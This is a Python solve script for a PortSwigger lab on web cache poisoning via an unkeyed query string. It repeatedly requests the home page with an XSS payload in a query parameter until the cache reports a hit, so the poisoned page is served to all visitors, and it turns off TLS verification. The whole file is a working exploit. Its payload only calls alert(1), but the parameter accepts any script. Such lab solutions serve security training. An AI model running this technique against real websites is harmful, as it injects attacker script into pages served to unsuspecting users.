#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Web cache poisoning via an unkeyed query string.

Injects an XSS payload into the query string and sends GET /
until X-Cache: hit, poisoning the entry served to all visitors.
"""

import argparse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PAYLOAD = "'/><script>alert(1)</script>"


def main():
    parser = argparse.ArgumentParser(
        description="Solve Web Cache Poisoning Lab 5 (unkeyed query string)"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("--payload", default=PAYLOAD)
    parser.add_argument("--max-attempts", type=int, default=20)
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    print(f"[*] Injecting payload via query string: {args.payload}")
    for i in range(1, args.max_attempts + 1):
        r = s.get(f"{lab}/", params={"evil": args.payload})
        cache_status = r.headers.get("X-Cache", "none")
        print(f"[{i}] X-Cache: {cache_status}")
        if cache_status == "hit":
            print("[+] Cache poisoned! Visitors loading / will trigger alert(1).")
            return

    print("[-] Cache hit not observed — try more attempts.")


if __name__ == "__main__":
    main()
